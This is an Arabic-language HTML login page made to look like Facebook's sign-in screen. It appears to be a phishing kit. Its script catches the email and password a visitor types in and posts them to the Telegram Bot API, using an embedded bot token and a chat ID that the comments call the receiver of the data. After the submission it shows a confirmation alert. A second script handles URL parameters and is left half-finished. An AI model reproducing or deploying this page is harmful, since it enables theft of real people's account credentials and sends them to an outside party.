<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>صفحة تسجيل دخول</title>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: Arial, sans-serif;
    }

    .login-box {
      background: #fff;
      width: 280px;
      margin: 100px auto;
      padding: 40px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      border-radius: 8px;
    }

    .login-box h2 {
      text-align: center;
      color: #1877f2;
      margin-bottom: 20px;
    }

    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
    }

    .login-box button {
      width: 100%;
      background: #1877f2;
      color: #fff;
      border: none;
      padding: 14px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
    }

    .login-box button:hover {
      background: #166fe5;
    }

    .login-box .footer {
      text-align: center;
      margin-top: 15px;
      font-size: 12px;
      color: #777;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>تسجيل الدخول</h2>
    <form id="loginForm">
      <input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
      <input type="password" id="password" name="password" placeholder="كلمة السر" required>
      <button type="submit">تسجيل الدخول</button>
    </form>
    <div class="footer">© 2025 Medo Broblems</div>
  </div>

  <script>
    const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA"; // 🔑 توكن البوت بتاعك
    const adminId = "7776054542";   // 🆔 الآيدى اللى هيستلم البيانات

    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const message = `📥 تسجيل دخول جديد:\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: adminId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        alert("✅ تم إرسال البيانات للبوت");
        // هنا تعمل Redirect لو عايز
      })
      .catch(error => {
        console.error("خطأ:", error);
        alert("❌ حصلت مشكلة أثناء الإرسال");
      });
    });
  </script>
<script>
    window.onload = function() {
      const params = new URLSearchParams(window.location.search);
      const chatId = params.get('chatId');
      const id = params.get('id');

      if (chatId) {
        // لو فيه chatId نحوله إلى id في نفس الصفحة
        const targetURL = `${window.location.pathname}?id=${chatId}`;
        window.location.href = targetURL;
      } else if (id) {
        // لو فيه id نعرضه
        document.getElementById('showId').innerText = id;
      } else {
        document.getElementById('showId').innerText = "❌ لا يوجد ID في الرابط.";
      }
    };
  </script>
</body>
</html>
